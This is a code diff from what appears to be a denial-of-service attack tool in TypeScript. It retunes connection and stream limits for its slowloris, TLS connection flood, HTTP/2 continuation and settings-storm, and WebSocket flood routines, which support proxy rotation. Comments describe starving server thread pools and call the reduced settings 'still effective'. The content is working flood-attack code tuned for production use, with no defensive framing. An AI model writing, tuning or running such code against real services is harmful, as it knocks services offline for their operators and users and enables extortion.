@@ -1470,12 +1470,12 @@ async function runSlowlorisReal(
   onStats: (p: number, b: number, c?: number) => void,
   useHttps = false,
 ): Promise<void> {
-  // 80 connections per thread — trickle headers every 10-25s, starves server thread pool
-  // DEV cap: container limit ~4GB; PROD (32GB): full 20K sockets
+  // 50 connections per thread — trickle headers every 10-25s, starves server thread pool
+  // Reduced from 100K to 15K: TLS sockets ~80KB each, 15K = ~1.2GB native memory per worker
   const IS_DEV = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV
-    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 200, 100000);      // prod: 100K sockets × 80KB TLS = 8GB (32GB avail)
+    ? Math.min(threads * 8, 800)            // dev: max 800 sockets
+    : Math.min(threads * 50, 15000);        // prod: 15K sockets × 80KB TLS = 1.2GB per worker
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -1628,12 +1628,12 @@ async function runConnFlood(
   useHttps = false,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
-  // DEV cap: container limit ~4GB; PROD (32GB): full 15K sockets
+  // 40 connections per thread — holds TLS handshake open, recycles every 5-20ms
+  // Reduced from 80K to 12K: TLS sockets ~80KB each, 12K = ~960MB native memory per worker
   const IS_DEV_CF = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV_CF
-    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 150, 80000);       // prod: 80K TLS sockets × 80KB = 6.4GB (32GB avail)
+    ? Math.min(threads * 8, 800)            // dev: max 800 sockets
+    : Math.min(threads * 40, 12000);        // prod: 12K TLS sockets × 80KB = 960MB per worker
   let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -2605,7 +2605,7 @@ async function runH2Continuation(
   };
 
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 150KB = 300MB
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 800 slots × 150KB = 120MB per worker
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2833,7 +2833,7 @@ async function runH2SettingsStorm(
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
   const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
-  const OPEN_STREAMS = IS_DEV ? 20 : 200; // PROD: 200 half-open streams × 2K slots = 400K pending streams
+  const OPEN_STREAMS = IS_DEV ? 20 : 50; // PROD: 50 half-open streams × 800 slots = 40K pending streams (still effective)
 
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
     const f = Buffer.allocUnsafe(9 + payload.length);
@@ -2979,7 +2979,7 @@ async function runWSFlood(
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 50, 40000); // 32GB: 40K WS × 40KB = 1.6GB
+  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 15, 5000); // 5K WS × 40KB = 200MB per worker
   const useHttps  = targetPort === 443;
 
   const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
